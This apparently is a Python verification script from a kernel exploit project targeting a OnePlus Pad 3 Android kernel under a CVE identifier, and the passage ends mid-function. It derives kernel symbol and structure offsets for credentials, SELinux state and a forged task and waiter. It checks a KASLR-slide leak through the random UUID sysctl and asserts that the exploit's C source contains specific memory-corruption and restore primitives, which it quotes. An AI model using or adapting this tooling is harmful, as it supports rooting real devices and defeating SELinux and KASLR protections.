#!/usr/bin/env python3
"""Re-derive the committed OPD2415 profile from the exact extracted Image.

This is intentionally read-only.  It checks kallsyms, BTF structure fields and
the compiler-generated pselect/futex stack geometry; it never talks to adb or
starts the exploit.
"""

from __future__ import annotations

import argparse
import copy
import functools
import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
KERNEL_RELEASE = "6.6.118-android15-8-g2e6b9c3812c5-ab15114928-4k"
TARGET = ROOT / "src/targets/oneplus-pad3/ex" / KERNEL_RELEASE
TARGET_INCLUDE = (
    "targets/oneplus-pad3/ex/"
    f"{KERNEL_RELEASE}/target-core66.h"
)
CORE66 = ROOT / "src/payloads/CVE-2026-43499/core66"
PAYLOAD = ROOT / "src/payloads/CVE-2026-43499"

SYMBOLS: dict[str, tuple[str, int]] = {
    "INIT_TASK_OFF": ("init_task", 0),
    "INIT_CRED_OFF": ("init_cred", 0),
    "INIT_UTS_NS_OFF": ("init_uts_ns", 0),
    "EMPTY_ZERO_PAGE_OFF": ("empty_zero_page", 0),
    "ROOT_TASK_GROUP_OFF": ("root_task_group", 0),
    "SELINUX_ENFORCING_OFF": ("selinux_state", 0),
    "KPTR_RESTRICT_OFF": ("kptr_restrict", 0),
    "SELINUX_BLOB_SIZES_OFF": ("selinux_blob_sizes", 0),
    "SECURITY_HOOK_HEADS_OFF": ("security_hook_heads", 0),
    "KMALLOC_CACHES_OFF": ("kmalloc_caches", 0),
    "ANON_PIPE_BUF_OPS_OFF": ("anon_pipe_buf_ops", 0),
    "CONFIGFS_READ_ITER_OFF": ("configfs_read_iter", 0),
    "CONFIGFS_BIN_WRITE_ITER_OFF": ("configfs_bin_write_iter", 0),
    "COPY_SPLICE_READ_OFF": ("copy_splice_read", 0),
    "NOOP_LLSEEK_OFF": ("noop_llseek", 0),
    "ASHMEM_MISC_FOPS_OFF": ("ashmem_misc", 0x10),
    "ASHMEM_FOPS_OFF": ("ashmem_fops", 0),
    "ASHMEM_IOCTL_OFF": ("ashmem_ioctl", 0),
    "ASHMEM_COMPAT_IOCTL_OFF": ("compat_ashmem_ioctl", 0),
    "ASHMEM_MMAP_OFF": ("ashmem_mmap", 0),
    "ASHMEM_OPEN_OFF": ("ashmem_open", 0),
    "ASHMEM_RELEASE_OFF": ("ashmem_release", 0),
    "ASHMEM_SHOW_FDINFO_OFF": ("ashmem_show_fdinfo", 0),
    "SLIDE_NFULNL_LOGGER_OFF": ("nfulnl_logger", 0),
    "SLIDE_LOGGERS_0_1_OFF": ("loggers", 0x8),
    "SLIDE_SYSCTL_BOOTID_OFF": ("sysctl_bootid", 0),
    "CALL_USERMODEHELPER_EXEC_WORK_OFF": ("call_usermodehelper_exec_work", 0),
    "SYSTEM_UNBOUND_WQ_OFF": ("system_unbound_wq", 0),
}

BTF_FIELDS: dict[str, dict[str, str]] = {
    "task_struct": {
        "stack": "TASK_STACK_OFF",
        "usage": "FAKE_TASK_USAGE_OFF",
        "prio": "FAKE_TASK_PRIO_OFF",
        "normal_prio": "FAKE_TASK_NORMAL_PRIO_OFF",
        "sched_task_group": "FAKE_TASK_TASK_GROUP_OFF",
        "pi_lock": "FAKE_TASK_PI_LOCK_OFF",
        "pi_waiters": "FAKE_TASK_PI_WAITERS_OFF",
        "pi_top_task": "FAKE_TASK_PI_TOP_TASK_OFF",
        "pi_blocked_on": "FAKE_TASK_PI_BLOCKED_ON_OFF",
        "pid": "TASK_PID_OFF",
        "tgid": "TASK_TGID_OFF",
        "real_parent": "TASK_REAL_PARENT_OFF",
        "parent": "TASK_PARENT_OFF",
        "children": "TASK_CHILDREN_OFF",
        "sibling": "TASK_SIBLING_OFF",
        "group_leader": "TASK_GROUP_LEADER_OFF",
        "thread_group": "TASK_THREAD_GROUP_OFF",
        "thread_node": "TASK_THREAD_NODE_OFF",
        "atomic_flags": "TASK_ATOMIC_FLAGS_OFF",
        "real_cred": "TASK_REAL_CRED_OFF",
        "cred": "TASK_CRED_OFF",
        "comm": "TASK_COMM_OFF",
        "tasks": "TASK_TASKS_OFF",
        "signal": "TASK_SIGNAL_OFF",
        "seccomp": "TASK_SECCOMP_OFF",
    },
    "signal_struct": {
        "nr_threads": "SIGNAL_NR_THREADS_OFF",
        "thread_head": "SIGNAL_THREAD_HEAD_OFF",
    },
    "rt_mutex_waiter": {
        "tree": "WAITER_TREE_ENTRY_OFF",
        "pi_tree": "WAITER_PI_TREE_ENTRY_OFF",
        "task": "WAITER_TASK_OFF",
        "lock": "WAITER_LOCK_OFF",
        "wake_state": "WAITER_WAKE_STATE_OFF",
        "ww_ctx": "WAITER_WW_CTX_OFF",
    },
    "cred": {
        "usage": "CRED_USAGE_OFF",
        "uid": "CRED_UID_OFF",
        "securebits": "CRED_SECUREBITS_OFF",
        "cap_inheritable": "CRED_CAPS_OFF",
        "security": "CRED_SECURITY_OFF",
        "user_ns": "CRED_USER_NS_OFF",
    },
    "seccomp": {
        "mode": "SECCOMP_MODE_OFF",
        "filter_count": "SECCOMP_FILTER_COUNT_OFF",
        "filter": "SECCOMP_FILTER_OFF",
    },
    "pipe_inode_info": {
        "head": "PIPE_HEAD_OFF",
        "tail": "PIPE_TAIL_OFF",
        "max_usage": "PIPE_MAX_USAGE_OFF",
        "ring_size": "PIPE_RING_SIZE_OFF",
        "nr_accounted": "PIPE_NR_ACCOUNTED_OFF",
        "readers": "PIPE_READERS_OFF",
        "writers": "PIPE_WRITERS_OFF",
        "files": "PIPE_FILES_OFF",
        "tmp_page": "PIPE_TMP_PAGE_OFF",
        "bufs": "PIPE_BUFS_OFF",
        "user": "PIPE_USER_OFF",
    },
    "file_operations": {
        "owner": "FOPS_OWNER_OFF",
        "llseek": "FOPS_LLSEEK_OFF",
        "read": "FOPS_READ_OFF",
        "write": "FOPS_WRITE_OFF",
        "read_iter": "FOPS_READ_ITER_OFF",
        "write_iter": "FOPS_WRITE_ITER_OFF",
        "unlocked_ioctl": "FOPS_IOCTL_OFF",
        "compat_ioctl": "FOPS_COMPAT_IOCTL_OFF",
        "mmap": "FOPS_MMAP_OFF",
        "open": "FOPS_OPEN_OFF",
        "release": "FOPS_RELEASE_OFF",
        "splice_read": "FOPS_SPLICE_READ_OFF",
        "show_fdinfo": "FOPS_SHOW_FDINFO_OFF",
    },
    "miscdevice": {"fops": "ASHMEM_MISCDEVICE_FOPS_BTF"},
    "workqueue_struct": {"dfl_pwq": "WQ_DFL_PWQ_OFF"},
    "pool_workqueue": {
        "pool": "PWQ_POOL_OFF",
        "wq": "PWQ_WQ_OFF",
        "work_color": "PWQ_WORK_COLOR_OFF",
        "refcnt": "PWQ_REFCNT_OFF",
        "nr_in_flight": "PWQ_NR_IN_FLIGHT_OFF",
        "nr_active": "PWQ_NR_ACTIVE_OFF",
        "max_active": "PWQ_MAX_ACTIVE_OFF",
    },
    "worker_pool": {
        "worklist": "POOL_WORKLIST_OFF",
        "nr_idle": "POOL_NR_IDLE_OFF",
    },
    "work_struct": {
        "data": "WORK_DATA_OFF",
        "entry": "WORK_ENTRY_OFF",
        "func": "WORK_FUNC_OFF",
    },
}


def run(command: list[str]) -> str:
    result = subprocess.run(command, text=True, capture_output=True, check=False)
    if result.returncode:
        raise RuntimeError(
            f"command failed ({result.returncode}): {' '.join(command)}\n"
            f"{result.stderr.strip()}"
        )
    return result.stdout


def sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as stream:
        for block in iter(lambda: stream.read(1024 * 1024), b""):
            digest.update(block)
    return digest.hexdigest()


def parse_defines(clang: str) -> dict[str, int]:
    result: dict[str, int] = {}
    pattern = re.compile(
        r"^\s*#define\s+([A-Z][A-Z0-9_]*)\s+(-?(?:0x[0-9a-fA-F]+|[0-9]+))(?:U?LL|UL|U|L)?\s*$"
    )
    preprocessed = run(
        [
            clang,
            "-dM",
            "-E",
            "-x",
            "c",
            "-Werror=macro-redefined",
            "-I",
            str(ROOT / "src"),
            "-I",
            str(TARGET),
            "-include",
            str(TARGET / "target-core66.h"),
            "/dev/null",
        ]
    )
    for line in preprocessed.splitlines():
        match = pattern.match(line)
        if match:
            result[match.group(1)] = int(match.group(2), 0)
    return result


def parse_symbols(vmlinux: Path, nm: str) -> dict[str, int]:
    result: dict[str, int] = {}
    for line in run([nm, "-n", str(vmlinux)]).splitlines():
        parts = line.split()
        if len(parts) >= 3:
            try:
                result[parts[2]] = int(parts[0], 16)
            except ValueError:
                pass
    return result


def parse_kallsyms(path: Path) -> dict[str, int]:
    result: dict[str, int] = {}
    for line in path.read_text(encoding="utf-8").splitlines():
        parts = line.split()
        if len(parts) >= 3:
            try:
                result[parts[2]] = int(parts[0], 16)
            except ValueError:
                pass
    return result


def parse_btf(raw: str) -> dict[str, list[tuple[int, dict[str, int]]]]:
    structs: dict[str, list[tuple[int, dict[str, int]]]] = {}
    current_name: str | None = None
    current_size = 0
    current_fields: dict[str, int] = {}
    struct_pattern = re.compile(r"^\[[0-9]+\] STRUCT '([^']+)' size=([0-9]+)")
    field_pattern = re.compile(r"^\s+'([^']*)'.*bits_offset=([0-9]+)")

    def finish() -> None:
        nonlocal current_name, current_size, current_fields
        if current_name is not None:
            structs.setdefault(current_name, []).append((current_size, current_fields))
        current_name = None
        current_size = 0
        current_fields = {}

    for line in raw.splitlines():
        struct_match = struct_pattern.match(line)
        if struct_match:
            finish()
            current_name = struct_match.group(1)
            current_size = int(struct_match.group(2))
            continue
        if line.startswith("["):
            finish()
            continue
        if current_name is not None:
            field_match = field_pattern.match(line)
            if field_match and field_match.group(1):
                current_fields[field_match.group(1)] = int(field_match.group(2)) // 8
    finish()
    return structs


def parse_btf_enums(raw: str) -> dict[str, list[dict[str, int]]]:
    enums: dict[str, list[dict[str, int]]] = {}
    current_name: str | None = None
    current_values: dict[str, int] = {}
    enum_pattern = re.compile(r"^\[[0-9]+\] ENUM(?:64)? '([^']+)' ")
    value_pattern = re.compile(r"^\s+'([^']+)' val=(-?[0-9]+)")

    def finish() -> None:
        nonlocal current_name, current_values
        if current_name is not None:
            enums.setdefault(current_name, []).append(current_values)
        current_name = None
        current_values = {}

    for line in raw.splitlines():
        enum_match = enum_pattern.match(line)
        if enum_match:
            finish()
            current_name = enum_match.group(1)
            continue
        if line.startswith("["):
            finish()
            continue
        if current_name is not None:
            value_match = value_pattern.match(line)
            if value_match:
                current_values[value_match.group(1)] = int(value_match.group(2))
    finish()
    return enums


def choose_struct(
    structs: dict[str, list[tuple[int, dict[str, int]]]],
    name: str,
    required_fields: set[str],
) -> tuple[int, dict[str, int]]:
    candidates = [
        candidate
        for candidate in structs.get(name, [])
        if required_fields <= candidate[1].keys()
    ]
    if not candidates:
        raise RuntimeError(f"BTF has no complete {name} definition")
    return max(candidates, key=lambda candidate: len(candidate[1]))


def choose_enum(
    enums: dict[str, list[dict[str, int]]],
    name: str,
    required_values: set[str],
) -> dict[str, int]:
    candidates = [
        candidate
        for candidate in enums.get(name, [])
        if required_values <= candidate.keys()
    ]
    if not candidates:
        raise RuntimeError(f"BTF has no complete {name} enum")
    return max(candidates, key=len)


def image_u64(image: bytes, offset: int, label: str) -> int:
    if offset < 0 or offset + 8 > len(image):
        raise RuntimeError(f"{label} is outside the raw Image: {offset:#x}")
    return int.from_bytes(image[offset : offset + 8], "little")


def image_u32(image: bytes, offset: int, label: str) -> int:
    if offset < 0 or offset + 4 > len(image):
        raise RuntimeError(f"{label} is outside the raw Image: {offset:#x}")
    return int.from_bytes(image[offset : offset + 4], "little")


def image_cstring(image: bytes, offset: int, label: str, limit: int = 128) -> str:
    if offset < 0 or offset >= len(image):
        raise RuntimeError(f"{label} is outside the raw Image: {offset:#x}")
    end = image.find(b"\0", offset, min(len(image), offset + limit))
    if end < 0:
        raise RuntimeError(f"{label} has no NUL terminator within {limit} bytes")
    return image[offset:end].decode("ascii")


def profile_int(mapping: dict[str, object], key: str) -> int:
    value = mapping[key]
    if isinstance(value, int):
        return value
    if isinstance(value, str):
        return int(value, 0)
    raise ValueError(f"profile {key} is not an integer: {value!r}")


def ordered_disassembly_contract(
    text: str, needles: list[str], label: str, failures: list[str]
) -> None:
    text = re.sub(r"\s+", " ", text)
    position = 0
    for needle in needles:
        needle = re.sub(r"\s+", " ", needle)
        found = text.find(needle, position)
        if found < 0:
            failures.append(f"{label}: missing ordered instruction {needle!r}")
            return
        position = found + len(needle)


def parse_disassembly_instructions(text: str) -> dict[int, str]:
    """Return exact address -> canonical instruction mappings from llvm-objdump."""

    instructions: dict[int, str] = {}
    pattern = re.compile(r"^\s*([0-9a-fA-F]+):\s+(.+?)\s*$")
    for line in text.splitlines():
        match = pattern.match(line)
        if not match:
            continue
        instruction = match.group(2).split("//", 1)[0].strip()
        instruction = re.sub(r"\s+<[^>]+>\s*$", "", instruction)
        instruction = re.sub(r"\s+", " ", instruction)
        instructions[int(match.group(1), 16)] = instruction
    return instructions


def exact_offset_disassembly_contract(
    instructions: dict[int, str],
    base: int,
    expected: dict[int, str],
    label: str,
    failures: list[str],
) -> None:
    """Require exact instructions at exact offsets inside one pinned function."""

    for offset, want in expected.items():
        got = instructions.get(base + offset)
        if got != want:
            failures.append(
                f"{label}: +0x{offset:x} got {got!r}, expected {want!r}"
            )


def validate_slide_observation(
    first: bytes,
    second: bytes,
    *,
    expected_qword1: int,
    direct_map_start: int,
    direct_map_end: int,
    name_rva: int,
    kimage_base: int,
    kaslr_min: int,
    kaslr_max: int,
    kaslr_align: int,
) -> int:
    if len(first) != 16 or len(second) != 16:
        raise ValueError("slide observation requires two complete 16-byte reads")
    if first != second:
        raise ValueError("slide UUID observations are not identical")
    leaked_name = int.from_bytes(first[:8], "little")
    qword1 = int.from_bytes(first[8:], "little")
    if not direct_map_start <= qword1 < direct_map_end:
        raise ValueError("slide UUID qword1 is not a direct-map address")
    if qword1 != expected_qword1:
        raise ValueError("slide UUID qword1 does not match the exact rb_erase child")
    if leaked_name < name_rva:
        raise ValueError("slide UUID name pointer underflows its Image RVA")
    stext = leaked_name - name_rva
    if stext < kimage_base:
        raise ValueError("slide UUID derives an address below _text")
    slide = stext - kimage_base
    if (
        slide < kaslr_min
        or slide > kaslr_max
        or slide % kaslr_align != 0
    ):
        raise ValueError("slide UUID derives an implausible KASLR slide")
    return stext


def slide_source_contract_errors(
    route: dict[str, object], *, expected_qword1: int
) -> list[str]:
    errors: list[str] = []
    restore = route.get("restore_contract")
    expected_descriptors = {
        "status": "exact-image-btf-rb-erase-verified-pending-runtime-rerun",
        "source": "random_table[5].data-to-nfulnl_logger-name",
        "endianness": "little",
        "derive_stext": "qword0-minus-nfulnl-name-rva",
        "fake_task_pi_root": "null",
        "fake_task_pi_leftmost": "null",
        "rb_cached_leftmost": "null-skip-rb_next",
    }
    for key, expected in expected_descriptors.items():
        if route.get(key) != expected:
            errors.append(f"wrong slide route descriptor {key}")
    if route.get("feature_macro") != "SLIDE_USE_RANDOM_UUID_LEAK":
        errors.append("wrong feature macro")
    if route.get("feature_value") != 1:
        errors.append("random UUID leak is not enabled")
    if route.get("proc_path") != "/proc/sys/kernel/random/uuid":
        errors.append("wrong proc path")
    if route.get("runtime_reads") != 2:
        errors.append("runtime contract does not require two reads")
    if route.get("require_identical_reads") is not True:
        errors.append("runtime contract does not require identical reads")
    if route.get("require_qword1_direct_map") is not True:
        errors.append("runtime contract does not require a direct-map qword1")
    try:
        if profile_int(route, "expected_qword1") != expected_qword1:
            errors.append("runtime contract has the wrong qword1")
    except (KeyError, ValueError):
        errors.append("runtime contract has no valid qword1")
    if not isinstance(restore, dict):
        errors.append("missing restore contract")
        return errors
    required_restore = {
        "uuid_data_before",
        "uuid_data_after",
        "nfulnl_type_qword_before",
        "nfulnl_type_qword_after",
        "nfulnl_logfn_expected_rva",
    }
    if not required_restore <= restore.keys():
        errors.append("restore contract omits a mutated or gated qword")
    if restore.get("exact_readback_required") is not True:
        errors.append("restore contract does not require exact readback")
    if restore.get("logfn_unchanged_readback_required") is not True:
        errors.append("restore contract does not gate the untouched logfn")
    if restore.get("success_before_restore") is not False:
        errors.append("restore contract permits success before cleanup")
    if restore.get("restore_order") != ["nfulnl_type_qword", "uuid_data"]:
        errors.append("restore contract does not restore nf_logger type first")
    return errors


def run_slide_contract_negative_fixtures(
    route: dict[str, object],
    *,
    expected_qword1: int,
    direct_map_start: int,
    direct_map_end: int,
    name_rva: int,
    kimage_base: int,
    kaslr_min: int,
    kaslr_max: int,
    kaslr_align: int,
    old_boot_id_alias: int,
) -> int:
    if slide_source_contract_errors(route, expected_qword1=expected_qword1):
        raise RuntimeError("positive slide source contract fixture was rejected")

    contract_mutations = {
        "one-read": lambda value: value.update(runtime_reads=1),
        "unstable-reads-allowed": lambda value: value.update(
            require_identical_reads=False
        ),
        "qword1-not-direct-map-gated": lambda value: value.update(
            require_qword1_direct_map=False
        ),
        "wrong-qword1": lambda value: value.update(
            expected_qword1=f"0x{expected_qword1 + 8:x}"
        ),
        "restore-not-exact": lambda value: value["restore_contract"].update(
            exact_readback_required=False
        ),
        "logfn-not-gated": lambda value: value["restore_contract"].update(
            logfn_unchanged_readback_required=False
        ),
    }
    for name, mutate in contract_mutations.items():
        fixture = copy.deepcopy(route)
        mutate(fixture)
        if not slide_source_contract_errors(
            fixture, expected_qword1=expected_qword1
        ):
            raise RuntimeError(f"negative slide source fixture passed: {name}")

    slide = kaslr_min
    leaked_name = kimage_base + slide + name_rva
    positive = leaked_name.to_bytes(8, "little") + expected_qword1.to_bytes(
        8, "little"
    )
    if validate_slide_observation(
        positive,
        positive,
        expected_qword1=expected_qword1,
        direct_map_start=direct_map_start,
        direct_map_end=direct_map_end,
        name_rva=name_rva,
        kimage_base=kimage_base,
        kaslr_min=kaslr_min,
        kaslr_max=kaslr_max,
        kaslr_align=kaslr_align,
    ) != kimage_base + slide:
        raise RuntimeError("positive slide observation fixture derived wrong _text")

    observation_mutations = {
        "short-second-read": (positive, positive[:8]),
        "different-second-read": (
            positive,
            bytes([positive[0] ^ 1]) + positive[1:],
        ),
        "qword1-mismatch": (
            positive[:8] + (expected_qword1 + 8).to_bytes(8, "little"),
            positive[:8] + (expected_qword1 + 8).to_bytes(8, "little"),
        ),
        "qword1-image-alias": (
            positive[:8] + (kimage_base + 0x2239468).to_bytes(8, "little"),
            positive[:8] + (kimage_base + 0x2239468).to_bytes(8, "little"),
        ),
        "old-boot-id-target": (
            positive[:8] + old_boot_id_alias.to_bytes(8, "little"),
            positive[:8] + old_boot_id_alias.to_bytes(8, "little"),
        ),
        "wrong-endian-name": (
            positive[:8][::-1] + positive[8:],
            positive[:8][::-1] + positive[8:],
        ),
        "misaligned-slide": (
            (leaked_name + 0x1000).to_bytes(8, "little") + positive[8:],
            (leaked_name + 0x1000).to_bytes(8, "little") + positive[8:],
        ),
    }
    for name, (first, second) in observation_mutations.items():
        try:
            validate_slide_observation(
                first,
                second,
                expected_qword1=expected_qword1,
                direct_map_start=direct_map_start,
                direct_map_end=direct_map_end,
                name_rva=name_rva,
                kimage_base=kimage_base,
                kaslr_min=kaslr_min,
                kaslr_max=kaslr_max,
                kaslr_align=kaslr_align,
            )
        except ValueError:
            continue
        raise RuntimeError(f"negative slide observation fixture passed: {name}")
    return len(contract_mutations) + len(observation_mutations)


_SOURCE_WHITESPACE_RUN = re.compile(r"\s+")
_SOURCE_NEEDS_NORMALIZATION = re.compile(r"[\t\n\r\f\v]| {2,}")


def normalized_source(text: str) -> str:
    if not _SOURCE_NEEDS_NORMALIZATION.search(text):
        return text
    return _SOURCE_WHITESPACE_RUN.sub(" ", text)


def pad3_uuid_source_contract_errors(sources: dict[str, str]) -> list[str]:
    """Check the Pad 3 opt-in route without changing legacy core66 targets."""

    errors: list[str] = []
    normalized = {name: normalized_source(text) for name, text in sources.items()}

    requirements = {
        "common": [
            "#define SLIDE_USE_RANDOM_UUID_LEAK 1",
            "P0_DATA_ALIAS_CONST(SLIDE_RANDOM_UUID_DATA_IMAGE)",
            "P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_TYPE_QWORD_IMAGE)",
        ],
        "slide": [
            '{0, SLIDE_NFULNL_LOGGER, "tree_pc"}, {1, 0, "tree_right"}, {2, SLIDE_RANDOM_UUID_DATA, "tree_left"}',
            '{5, SLIDE_NFULNL_LOGGER, "pi0"}, {6, 0, "pi1"}, {7, SLIDE_RANDOM_UUID_DATA, "pi2"}',
            'static const char path[] = "/proc/sys/kernel/random/uuid";',
            "!slide_read_uuid_raw(raw) || !slide_read_uuid_raw(again)",
            "memcmp(raw, again, sizeof(raw)) != 0",
            "value |= (uint64_t)raw[first + i] << (i * 8)",
            "slide_uuid_qword(raw, 0)",
            "slide_uuid_qword(raw, 1)",
            "const uint64_t target_alias = (uint64_t)SLIDE_RANDOM_UUID_DATA",
            "collateral != target_alias",
            "leaked >= DIRECT_MAP_BASE && leaked < DIRECT_MAP_END",
            "const uint64_t name_rva = SLIDE_NFULNL_LOGGER_NAME_OFF",
            "const uint64_t stext = leaked - name_rva",
            "if (!slide_uuid_oracle_pristine())",
            "if (!payload_publish_primitive_dirty())",
            "_exit(slide_store_observed ? 2 : 1)",
            "WIFEXITED(status) && WEXITSTATUS(status) == 2",
            'pr_error("slide store landed but exact base validation failed; " "refusing another attempt until reboot\\n")',
        ],
        "util": [
            "if (payload_mode == PAGE_PAYLOAD_SLIDE) { write_pc = SLIDE_NFULNL_LOGGER; write_right = 0; write_left = SLIDE_RANDOM_UUID_DATA;",
            'pr_info("slide uuid forged erase pi-root empty\\n")',
            "put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0); put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0); put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);",
        ],
        "fops": [
            "const uintptr_t uuid_data = SLIDE_RANDOM_UUID_DATA",
            "const uintptr_t type_qword = SLIDE_NFULNL_LOGGER_TYPE_QWORD",
            "const uintptr_t logfn_field = nfulnl + 0x10",
            "const uint64_t want_uuid_data = 0",
            "SLIDE_NFULNL_LOGGER_TYPE_QWORD_ORIGINAL",
            "kaslr_base + SLIDE_NFULNL_LOGGER_LOGFN_OFF",
            "slide_uuid_data_before == stamped_parent",
            "slide_nfulnl_name_before == want_name",
            "slide_nfulnl_type_before == stamped_type",
            "slide_nfulnl_logfn_before == want_logfn",
            "slide_uuid_restore_ret = configfs_write_once( fd, uuid_data",
            "slide_nfulnl_type_restore_ret = configfs_write_once( fd, type_qword",
            "slide_uuid_data_after == want_uuid_data",
            "slide_nfulnl_type_after == want_type",
            "slide_nfulnl_logfn_after == want_logfn",
            "return stamped_exact && restored_exact",
            "KPHYS_RUNTIME_LIVE_VALIDATION",
            "KPHYS_NFULNL_NAME_PREFIX_VALUE",
            "KPHYS_MEMSTART_ADDR_OFF",
            "KPHYS_KIMAGE_VADDR_OFF",
            "KPHYS_KIMAGE_VOFFSET_OFF",
            "runtime_kimage_vaddr - runtime_kimage_voffset",
            "runtime_phys == p0_kernel_phys_load",
            '"nfulnl-name-rodata"',
            '"nfulnl-name-pointer"',
            '"nfulnl-type-qword"',
            '"nfulnl-logfn-pointer"',
            '"ashmem-fops-open-pointer"',
            "pipe_phys_read_data( fd, checks[i].direct, &observed, sizeof(observed))",
            "observed != checks[i].expected",
        ],
    }
    for source_name, needles in requirements.items():
        text = normalized.get(source_name, "")
        for needle in needles:
            if normalized_source(needle) not in text:
                errors.append(f"{source_name} omits {needle!r}")

    if "stext = leaked - name_rva -" in normalized.get("slide", ""):
        errors.append("slide subtracts a physical/direct-map delta from name RVA")

    slide = normalized.get("slide", "")
    slide_order = [
        slide.find("if (!slide_uuid_oracle_pristine())"),
        slide.find("if (!payload_publish_primitive_dirty())"),
        slide.find("pid_t child = SYSCHK(fork())"),
        slide.find("SYSCHK(waitpid(child, &status, 0))"),
        slide.find("WIFEXITED(status) && WEXITSTATUS(status) == 2"),
    ]
    if any(position < 0 for position in slide_order) or slide_order != sorted(
        slide_order
    ):
        errors.append("slide preflight/dirty/fork/fail-stop order is not exact")

    fops = normalized.get("fops", "")
    type_restore = fops.find(
        "slide_nfulnl_type_restore_ret = configfs_write_once( fd, type_qword"
    )
    uuid_restore = fops.find(
        "slide_uuid_restore_ret = configfs_write_once( fd, uuid_data"
    )
    if type_restore < 0 or uuid_restore < 0 or type_restore >= uuid_restore:
        errors.append("fops does not restore the unsafe nf_logger type before UUID data")
    restore = fops.find("if (!restore_slide_boot_id(fd))")
    validate = fops.find("if (!leak_kernel_base(fd))")
    if restore < 0 or validate < 0 or restore >= validate:
        errors.append("fops does not gate later success on exact UUID cleanup")
    return errors


def run_pad3_uuid_source_negative_fixtures(sources: dict[str, str]) -> int:
    if pad3_uuid_source_contract_errors(sources):
        raise RuntimeError("positive Pad 3 UUID C source contract was rejected")

    mutations: dict[str, tuple[str, str, str]] = {
        "one-read": (
            "slide",
            "!slide_read_uuid_raw(raw) || !slide_read_uuid_raw(again)",
            "!slide_read_uuid_raw(raw)",
        ),
        "qword1-not-gated": (
            "slide",
            "collateral != target_alias",
            "collateral == target_alias",
        ),
        "direct-map-not-rejected": (
            "slide",
            "leaked >= DIRECT_MAP_BASE && leaked < DIRECT_MAP_END",
            "leaked >= DIRECT_MAP_END && leaked < DIRECT_MAP_END",
        ),
        "wrong-endian": (
            "slide",
            "value |= (uint64_t)raw[first + i] << (i * 8)",
            "value |= (uint64_t)raw[first + i] << ((7 - i) * 8)",
        ),
        "physical-delta-subtraction": (
            "slide",
            "const uint64_t stext = leaked - name_rva",
            "const uint64_t stext = leaked - name_rva - P0_KERNEL_PHYS_DELTA",
        ),
        "pi-target-drift": (
            "slide",
            '{5, SLIDE_NFULNL_LOGGER, "pi0"}, {6, 0, "pi1"}, {7, SLIDE_RANDOM_UUID_DATA, "pi2"}',
            '{5, SLIDE_LOGGERS_0_1, "pi0"}, {6, 0, "pi1"}, {7, SLIDE_RANDOM_BOOT_ID_DATA, "pi2"}',
        ),
        "heap-template-target-drift": (
            "util",
            "write_left = SLIDE_RANDOM_UUID_DATA",
            "write_left = SLIDE_RANDOM_BOOT_ID_DATA",
        ),
        "slide-stale-pi-root": (
            "util",
            "put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0); put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0); put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);",
            "put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0); put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF); put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);",
        ),
        "preflight-omitted": (
            "slide",
            "if (!slide_uuid_oracle_pristine())",
            "if (slide_uuid_oracle_pristine())",
        ),
        "dirty-receipt-omitted": (
            "slide",
            "if (!payload_publish_primitive_dirty())",
            "if (payload_publish_primitive_dirty())",
        ),
        "store-observed-exit-omitted": (
            "slide",
            "_exit(slide_store_observed ? 2 : 1)",
            "_exit(1)",
        ),
        "name-gate-omitted": (
            "fops",
            "slide_nfulnl_name_before == want_name",
            "slide_nfulnl_name_before != want_name",
        ),
        "uuid-not-direct-map": (
            "common",
            "P0_DATA_ALIAS_CONST(SLIDE_RANDOM_UUID_DATA_IMAGE)",
            "SLIDE_RANDOM_UUID_DATA_IMAGE",
        ),
        "type-restore-omitted": (
            "fops",
            "slide_nfulnl_type_restore_ret = configfs_write_once( fd, type_qword",
            "slide_nfulnl_type_restore_ret = -1; /* omitted */ ( fd, type_qword",
        ),
        "logfn-readback-omitted": (
            "fops",
            "slide_nfulnl_logfn_after == want_logfn",
            "slide_nfulnl_logfn_after != want_logfn",
        ),
        "live-kphys-value-gate-omitted": (
            "fops",
            "observed != checks[i].expected",
            "observed == checks[i].expected",
        ),
    }
    for name, (source_name, old, new) in mutations.items():
        fixture = copy.deepcopy(sources)
        if old not in normalized_source(fixture[source_name]):
            raise RuntimeError(
                f"cannot construct Pad 3 UUID source fixture {name}: {old!r}"
            )
        fixture[source_name] = normalized_source(fixture[source_name]).replace(
            old, new, 1
        )
        if not pad3_uuid_source_contract_errors(fixture):
            raise RuntimeError(f"negative Pad 3 UUID source fixture passed: {name}")

    order_fixture = copy.deepcopy(sources)
    order_source = normalized_source(order_fixture["fops"])
    type_write = (
        "slide_nfulnl_type_restore_ret = configfs_write_once( fd, type_qword"
    )
    uuid_write = "slide_uuid_restore_ret = configfs_write_once( fd, uuid_data"
    if type_write not in order_source or uuid_write not in order_source:
        raise RuntimeError("cannot construct Pad 3 UUID restore-order fixture")
    placeholder = "PAD3_UUID_RESTORE_ORDER_PLACEHOLDER"
    order_source = order_source.replace(type_write, placeholder, 1)
    order_source = order_source.replace(uuid_write, type_write, 1)
    order_source = order_source.replace(placeholder, uuid_write, 1)
    order_fixture["fops"] = order_source
    if not pad3_uuid_source_contract_errors(order_fixture):
        raise RuntimeError("negative Pad 3 UUID source fixture passed: restore-order")
    return len(mutations) + 1


def _c_matching_delimiter(
    text: str, start: int, opening: str, closing: str
) -> int:
    """Return the matching C delimiter without regex backtracking."""

    if start < 0 or start >= len(text) or text[start] != opening:
        return -1
    depth = 0
    quote: str | None = None
    escaped = False
    index = start
    while index < len(text):
        char = text[index]
        if quote is not None:
            if escaped:
                escaped = False
            elif char == "\\":
                escaped = True
            elif char == quote:
                quote = None
            index += 1
            continue
        if char in {'"', "'"}:
            quote = char
            index += 1
            continue
        if text.startswith("/*", index):
            end = text.find("*/", index + 2)
            if end < 0:
                return -1
            index = end + 2
            continue
        if text.startswith("//", index):
